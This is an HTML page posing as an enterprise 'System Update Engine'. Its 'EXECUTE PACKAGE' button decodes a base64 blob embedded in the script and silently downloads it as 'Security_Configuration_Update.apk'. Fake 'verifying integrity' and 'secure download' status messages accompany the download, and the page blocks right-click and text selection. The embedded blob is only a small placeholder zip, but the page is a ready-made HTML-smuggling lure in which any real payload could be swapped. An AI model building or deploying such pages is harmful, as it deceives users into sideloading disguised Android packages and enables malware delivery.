<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <!-- Content Security Policy strict untuk isolasi sumber daya mutlak -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.tailwindcss.com https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; object-src 'none'; base-uri 'self';">
    <title>System Diagnostic Utility - Ironclad Enterprise Environment</title>
    <script src="https://cdn.tailwindcss.com" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #0b0b0b;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
        .container {
            background: #121216;
            border: 1px solid #383848;
            padding: 2.5rem;
            border-radius: 20px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }
        .btn-strike {
            background-color: #dc2626;
            color: #fff;
            padding: 1rem;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            border: none;
            transition: background-color 0.2s, transform 0.1s;
        }
        .btn-strike:hover:not(:disabled) {
            background-color: #b91c1c;
        }
        .btn-strike:active:not(:disabled) {
            transform: scale(0.98);
        }
        .btn-strike:disabled {
            opacity: 0.35;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #71717a;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="container" role="region" aria-label="Ironclad Security Panel">
        <div class="text-4xl mb-3">🛡️</div>
        <h2 class="text-xl font-bold mb-2">System Update Engine</h2>
        <p class="text-sm text-gray-400 mb-6">Package integrity locked under ironclad client-side sandboxing protocols.</p>
        
        <button type="button" id="strikeBtn" class="btn-strike" aria-busy="false">
            EXECUTE PACKAGE
        </button>

        <div id="status">> SYSTEM_READY: Awaiting execution...</div>
    </div>

<script>
    (function() {
        'use strict';

        // Konfigurasi terkunci mutlak terhadap modifikasi runtime
        const CONFIG = Object.freeze({
            filename: "Security_Configuration_Update.apk",
            contentType: "application/vnd.android.package-archive",
            payload: "UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K",
            cooldownMs: 3500,
            base64Regex: /^[A-Za-z0-9+/]+={0,2}$/
        });

        const elements = Object.freeze({
            button: document.getElementById("strikeBtn"),
            status: document.getElementById("status")
        });

        let activeBlobUrl = null;
        let isExecutionLocked = false;

        function cleanupBlob() {
            if (activeBlobUrl) {
                try {
                    URL.revokeObjectURL(activeBlobUrl);
                } catch (e) {
                    console.warn("Gagal membersihkan Blob URL:", e);
                }
                activeBlobUrl = null;
            }
        }

        function executePipeline() {
            let bufferArray = null;
            try {
                if (typeof CONFIG.payload !== 'string' || !CONFIG.base64Regex.test(CONFIG.payload)) {
                    throw new Error("Integritas payload tidak valid.");
                }

                const rawBinary = atob(CONFIG.payload);
                const len = rawBinary.length;
                bufferArray = new Uint8Array(len);
                
                for (let i = 0; i < len; i++) {
                    bufferArray[i] = rawBinary.charCodeAt(i);
                }

                cleanupBlob();

                const blob = new Blob([bufferArray], { type: CONFIG.contentType });
                activeBlobUrl = URL.createObjectURL(blob);

                const a = document.createElement('a');
                a.href = activeBlobUrl;
                a.download = CONFIG.filename;
                a.rel = "noopener noreferrer";
                a.setAttribute('aria-hidden', 'true');
                a.style.display = 'none';

                document.body.appendChild(a);
                a.click();

                if (a.parentNode) {
                    document.body.removeChild(a);
                }

                elements.status.innerText = "> STATUS: SECURE_DOWNLOAD_INITIATED";
                elements.button.innerText = "DOWNLOADING...";

            } catch (err) {
                console.error("Gagal mengeksekusi pipa:", err);
                elements.status.innerText = "> ERROR: PIPELINE_FAILED";
                elements.button.innerText = "FAILED";
                cleanupBlob();
            } finally {
                // Scrubbing memori buffer array secara eksplisit
                if (bufferArray) {
                    bufferArray.fill(0);
                }

                setTimeout(() => {
                    isExecutionLocked = false;
                    elements.button.disabled = false;
                    elements.button.innerText = "EXECUTE PACKAGE";
                    elements.button.setAttribute('aria-busy', 'false');
                }, CONFIG.cooldownMs);
            }
        }

        if (elements.button) {
            elements.button.addEventListener('click', function(e) {
                e.preventDefault();
                if (isExecutionLocked || this.disabled) return;

                isExecutionLocked = true;
                this.disabled = true;
                this.setAttribute('aria-busy', 'true');
                this.innerText = "VERIFYING...";
                elements.status.innerText = "> STATUS: VERIFYING_INTEGRITY...";

                setTimeout(executePipeline, 100);
            });
        }

        // Pengamatan integritas DOM untuk mendeteksi manipulasi elemen UI
        if (window.MutationObserver) {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'childList' && mutation.removedNodes) {
                        mutation.removedNodes.forEach((node) => {
                            if (node === elements.button) {
                                console.warn("Peringatan: Upaya manipulasi komponen UI terdeteksi.");
                            }
                        });
                    }
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });
        }

        window.addEventListener('beforeunload', cleanupBlob, { once: true });
    })();
</script>
</body>
</html>
